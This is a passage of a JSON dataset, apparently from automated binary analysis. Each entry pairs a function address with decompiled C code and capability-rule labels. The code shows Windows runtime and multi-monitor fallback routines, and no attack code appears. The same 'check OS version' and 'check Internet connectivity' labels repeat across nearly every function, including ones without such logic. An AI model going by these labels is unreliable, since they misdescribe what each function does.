        "decompiled_code": "\nvoid fcn.0042cc0c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42cc82;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49aa5c = *0x49aa5c + 1;\n    if (*0x49aa5c == 0) {\n        *0x49aa60 = 1;\n        fcn.00404650();\n        **0x495bbc = 0;\n        **0x49584c = 0;\n        **0x495b4c = 0;\n        if (*0x49aa6c != '\\0') {\n            sub.ole32.dll_CoUninitialize();\n        }\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 222
    },
    "0042df1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042dffb)\n\nvoid __fastcall fcn.0042df1c(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x42e039;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        puStack56 = 0x42df5a;\n        fcn.00405584();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    if (-1 < *(*(in_EAX + 0x10) + 8) + -1) {\n        puStack56 = 0x42df85;\n        fcn.004198b4();\n        puStack56 = 0x42df90;\n        fcn.00407024();\n        uStack60 = 0x42e008;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        fcn.0040700c();\n        cVar2 = fcn.0040f95c();\n        if (cVar2 != '\\0') {\n            (**(_pe_dos_header + 0x40))();\n            (**(_pe_dos_header + 0x44))();\n        }\n        iVar3 = (**(_pe_dos_header + 0x10))();\n        if (iVar3 < 1) {\n            *in_FS_OFFSET = uStack52;\n            return;\n        }\n        puStack56 = 0x42dfe6;\n        fcn.00404f70();\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x42e040;\n    uStack48 = 0x42e030;\n    fcn.0040700c();\n    uStack48 = 0x42e038;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 568
    },
    "0042d748": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042d748(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY112;\n    uint uStackY108;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint in_stack_ffffffa0;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x42d9df;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puVar1 = &stack0xfffffffc;\n    var_ch = param_2;\n    var_8h = in_EAX;\n    if (param_1 != 0) {\n        puStack80 = 0x42d780;\n        fcn.00405584();\n        puVar1 = puStack68;\n    }\n    puStack68 = puVar1;\n    if (0 < *(*(var_8h + 0x10) + 8)) {\n        puStack80 = 0x42d79c;\n        var_20h = fcn.00404620();\n        uStack84 = 0x42d9ba;\n        uStack88 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa8;\n        iVar2 = *(*(var_8h + 0x10) + 8);\n        puStack80 = &stack0xfffffffc;\n        if (-1 < iVar2 + -1) {\n            var_10h = 0;\n            puStack80 = &stack0xfffffffc;\n            var_24h = iVar2;\n            do {\n                iVar2 = fcn.004198b4();\n                iVar2 = (**(**(iVar2 + 4) + 0x10))();\n                if (0 < iVar2) {\n                    fcn.0041975c();\n                }\n                var_10h = var_10h + 1;\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        if (*(var_20h + 8) == 0) {\n            var_2ch = fcn.004059dc();\n            var_28h._0_1_ = 6;\n            in_stack_ffffffa0 = 0;\n            uStackY100 = 0x42d827;\n            fcn.0040dbfc(0, &fcn.0042d748::var_2ch);\n            uStackY100 = 0x42d82c;\n            fcn.00404ec4();\n        }\n        else {\n            if (*(var_20h + 8) != 1) {\n                var_18h = fcn.00404620();\n                uStackY100 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff9c;\n                if (-1 < *(var_20h + 8) + -1) {\n                    var_10h = 0;\n                    var_24h = *(var_20h + 8);\n                    do {\n                        puStackY104 = 0x42d890;\n                        iVar2 = fcn.004198b4();\n                        puStackY104 = 0x42d89d;\n                        var_1ch = (**(**(iVar2 + 4) + 0x14))();\n                        if (var_1ch != NULL) {\n                            uStackY108 = 0x42d902;\n                            uStackY112 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffff90;\n                            puStackY104 = &stack0xfffffffc;\n                            iVar2 = (**(*var_1ch + 0x14))();\n                            if (-1 < iVar2 + -1) {\n                                var_14h = 0;\n                                do {\n                                    (**(*var_1ch + 0xc))();\n                                    (**(*var_18h + 0x3c))();\n                                    var_14h = var_14h + 1;\n                                    iVar2 = iVar2 + -1;\n                                } while (iVar2 != 0);\n                            }\n                            *in_FS_OFFSET = uStackY112;\n                            puStackY104 = 0x42d909;\n                            uStackY108 = 0x42d901;\n                            fcn.00404650();\n                            return;\n                        }\n                        var_10h = var_10h + 1;\n                        var_24h = var_24h + -1;\n                    } while (var_24h != 0);\n                }\n                if (*(var_8h + 0xc) == 0) {\n                    puStackY104 = 0x42d96d;\n                    iVar2 = (**(*var_18h + 0x18))();\n                    puStackY104 = 0x42d97c;\n                    (**(*var_18h + 0xc))();\n                    puStackY104 = 0x42d987;\n                    (**(**(iVar2 + 4) + 0x20))();\n                }\n                else {\n                    puStackY104 = 0x42d929;\n                    (**(*var_18h + 0x90))();\n                    puStackY104 = 0x42d937;\n                    iVar2 = (**(**(var_8h + 0xc) + 0xc))();\n                    if (-1 < iVar2) {\n                        puStackY104 = 0x42d947;\n                        iVar2 = (**(*var_18h + 0x18))();\n                        puStackY104 = 0x42d956;\n                        (**(*var_18h + 0xc))();\n                        puStackY104 = 0x42d961;\n                        (**(**(iVar2 + 4) + 0x20))();\n                    }\n                }\n                *in_FS_OFFSET = uStackY100;\n                fcn.00404650();\n                return;\n            }\n            iVar2 = fcn.004198b4();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        uStack88 = 0x42d9c1;\n        fcn.00404650();\n        return;\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x42d9e6;\n    uStack72 = 0x42d9d6;\n    fcn.00405530();\n    uStack72 = 0x42d9de;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1599
    },
    "0042da84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042dba2)\n// WARNING: Removing unreachable block (ram,0x0042dbcd)\n// WARNING: Removing unreachable block (ram,0x0042dbd0)\n// WARNING: Removing unreachable block (ram,0x0042dc10)\n// WARNING: Removing unreachable block (ram,0x0042dc2c)\n// WARNING: Removing unreachable block (ram,0x0042dc30)\n// WARNING: Removing unreachable block (ram,0x0042dc76)\n// WARNING: Removing unreachable block (ram,0x0042dc3f)\n// WARNING: Removing unreachable block (ram,0x0042dc83)\n\nvoid __fastcall fcn.0042da84(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    uStack76 = 0x42dcfd;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1ch = 0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00405584();\n        puVar1 = puStack72;\n    }\n    puStack72 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040dbc0();\n        fcn.00404ec4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.004198b4();\n            fcn.00407024();\n            fcn.00407050();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                var_1ch = var_1ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if (var_1ch == 0) {\n        fcn.0040dbc0();\n        fcn.00404ec4();\n    }\n    if (var_1ch == 1) {\n        fcn.0042d9f0(&stack0xfffffffc);\n    }\n    else if (*(in_EAX + 0xc) == 0) {\n        fcn.0042d9f0(&stack0xfffffffc);\n    }\n    else {\n        fcn.00407050();\n        fcn.0042d9f0(&stack0xfffffffc);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x42dd04;\n    uStack76 = 0x42dcd1;\n    fcn.0040700c();\n    uStack76 = 0x42dcd9;\n    fcn.00405530();\n    uStack76 = 0x42dcec;\n    fcn.004060f8();\n    uStack76 = 0x42dcf4;\n    fcn.0040700c();\n    uStack76 = 0x42dcfc;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 833
    },
    "0042dd34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dd34(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42ddf3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00405584();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    if (*(*(in_EAX + 0x14) + 8) == 0) {\n        fcn.0040dbc0();\n        fcn.00404ec4();\n    }\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.004198b4();\n            fcn.00407024();\n            fcn.00407050();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42ddfa;\n    uStack36 = 0x42ddea;\n    fcn.0040700c();\n    uStack36 = 0x42ddf2;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 428
    },
    "0042de60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042de60(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42de79;\n    fcn.004059cc();\n    uStack28 = 0x42df0a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.0042da84();\n    }\n    else if (iVar1 == 2) {\n        fcn.0042d4ec();\n    }\n    else if (iVar1 == 3) {\n        fcn.0042d51c();\n    }\n    else if (iVar1 == 8) {\n        fcn.0042da84();\n    }\n    else {\n        fcn.0042d680(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x42df11;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 346
    },
    "0042d290": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d290(void)\n\n{\n    if (*0x49aa74 == 0) {\n        fcn.0042d340();\n        fcn.00407024();\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "0042d2bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0042d2bc(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    fcn.0042d290();\n    uVar1 = fcn.00407050();\n    return uVar1 & 0xffffff00 | *in_EAX != 0;\n}\n",
        "token_count": 95
    },
    "0042d51c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d51c(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d671;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x42d549;\n    piVar3 = fcn.00404620();\n    uStack52 = 0x42d626;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(in_EAX + 0x10) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            iVar4 = fcn.004198b4();\n            cVar2 = (**(**(iVar4 + 4) + 0x18))();\n            if (cVar2 != '\\0') {\n                (**(**(iVar4 + 4) + 0xc))();\n                (**(*piVar3 + 0x3c))();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    iVar5 = (**(*piVar3 + 0x14))();\n    if (iVar5 == 1) {\n        iVar5 = (**(*piVar3 + 0x18))();\n        (**(**(iVar5 + 4) + 0x1c))();\n    }\n    else {\n        iVar5 = (**(*piVar3 + 0x14))();\n        if ((0 < iVar5) && (*(in_EAX + 0xc) != 0)) {\n            (**(*piVar3 + 0x90))();\n            (**(**(in_EAX + 0xc) + 0x10))();\n            (**(*piVar3 + 0x18))();\n            fcn.00407024();\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x42d62d;\n    uStack52 = 0x42d625;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 621
    },
    "0042d680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d680(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42d724;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        fcn.00405584();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar4 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.004198b4();\n            fcn.0040700c(*(iVar3 + 4));\n            cVar2 = fcn.0040f95c();\n            if (cVar2 != '\\0') {\n                (**(_pe_dos_header + 0x40))(arg_8h, arg_ch);\n                break;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42d72b;\n    uStack40 = 0x42d723;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 389
    },
    "0042e120": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e120(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42e136;\n    fcn.004059cc();\n    uStack28 = 0x42e1dd;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x49aaa0) == '\\0') {\n        if (*0x49aa9c == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x49aaa8 == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x49aa88 = fcn.0042e120(),  *0x49aaa8 == '\\0')) {\n                fcn.00405530();\n            }\n            uVar1 = fcn.004059dc();\n            in_stack_ffffffd8 = *0x49aa9c;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x49aa9c, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x49aaa8 = '\\x01';\n        }\n        *(in_AL + 0x49aaa0) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x42e1e4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 440
    },
    "0042e204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e204(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x49aaa0 == '\\0') {\n        *0x49aa78 = fcn.0042e120();\n        (**0x49aa78)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "0042e28c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e28c(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x49aaa2 == '\\0') {\n        *0x49aa80 = fcn.0042e120();\n        uVar1 = (**0x49aa80)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x49aa78)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x49aa78)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 236
    },
    "0042e31c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e31c(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x49aaa1 == '\\0') {\n        *0x49aa7c = fcn.0042e120();\n        uVar1 = (**0x49aa7c)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0042e28c(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 240
    },
    "0042e3b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e3b4(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x49aaa3 == '\\0') {\n        *0x49aa84 = fcn.0042e120();\n        uVar1 = (**0x49aa84)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x49aa78)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x49aa78)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 238
    },
    "0042e44c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e44c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x49aaa4 == '\\0') {\n        *0x49aa88 = fcn.0042e120();\n        uVar1 = (**0x49aa88)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x49aa78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x49aa78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e518);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 398
    },
    "0042e520": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e520(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x49aaa5 == '\\0') {\n        *0x49aa8c = fcn.0042e120();\n        uVar1 = (**0x49aa8c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x49aa78)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x49aa78)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42e5ec);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 400
    },
    "0042e5f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
